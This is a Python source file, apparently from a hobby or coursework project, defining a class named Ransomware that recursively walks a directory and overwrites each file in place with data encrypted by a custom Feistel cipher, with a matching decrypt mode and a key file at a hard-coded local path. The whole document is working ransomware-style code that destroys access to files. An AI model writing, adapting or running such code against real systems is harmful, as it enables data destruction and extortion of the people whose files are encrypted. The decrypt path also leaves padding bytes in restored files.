import os
from feistel_algorithm import FeistelAlgorithm
import struct 

class Ransomware:
    class Mode:
        ENCRYPT = 'encrypt'
        DECRYPT = 'decrypt'

    def __init__(self):
        self.mode = self.Mode.ENCRYPT
        self.key_path = "/home/testys/Documents/Fesitel--master/ransomware.key"
        self.feistel_algorithm = FeistelAlgorithm()  # Instantiate this class

    def set_mode(self, mode):
        self.mode = mode

    def process_directory(self, directory):
        for filename in os.listdir(directory):
            file_path = os.path.join(directory, filename)
            if os.path.isdir(file_path):
                self.process_directory(file_path)
            else:
                self.process_file(file_path)

    def process_file(self, file_path):
        with open(file_path, 'rb') as file:
            file_data = file.read()
        if self.mode == self.Mode.ENCRYPT:
            encrypted_data = self.encrypt(file_data)
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)
            print(f"Encrypted {file_path}")
        elif self.mode == self.Mode.DECRYPT:
            decrypted_data = self.decrypt(file_data)
            with open(file_path, 'wb') as file:
                file.write(decrypted_data)
            print(f"Decrypted {file_path}")

    def load_keys(self):
        with open(self.key_path, 'rb') as key_file:
            keys = key_file.read()
        return keys

    def save_keys(self, keys):
        with open(self.key_path, 'wb') as key_file:
            key_file.write(keys)

    def encrypt(self, data):
        keys = self.load_keys()
        self.feistel_algorithm.initialize(keys)
        int_data = self.convert_bytes_to_int_array(data)
        encrypted_int_data = self.feistel_algorithm.encrypt_data(int_data)
        return self.convert_int_array_to_bytes(encrypted_int_data)

    def decrypt(self, data):
        keys = self.load_keys()
        self.feistel_algorithm.initialize(keys)
        int_data = self.convert_bytes_to_int_array(data)
        decrypted_int_data = self.feistel_algorithm.decrypt_data(int_data)
        return self.convert_int_array_to_bytes(decrypted_int_data)
    
    def process(self, path):
        if os.path.isdir(path):
            self.process_directory(path)
        else:
            self.process_file(path)

    def convert_bytes_to_int_array(self, data):
        padding_length = (-len(data)) % 4
        data += b'\x00' * padding_length  # Padding with null bytes if necessary

        int_array = []
        for i in range(0, len(data), 4):
            # Unpack the bytes directly into an integer
            int_val = struct.unpack('>I', data[i:i+4])[0]
            int_array.append(int_val)
        return int_array
    
    def convert_int_array_to_bytes(self, int_array):
        # Use struct to pack integers back into bytes
        # '>I' denotes big-endian unsigned int (4 bytes)
        byte_data = bytearray()
        for num in int_array:
            packed_data = struct.pack('>I', num)
            byte_data.extend(packed_data)
        return bytes(byte_data)
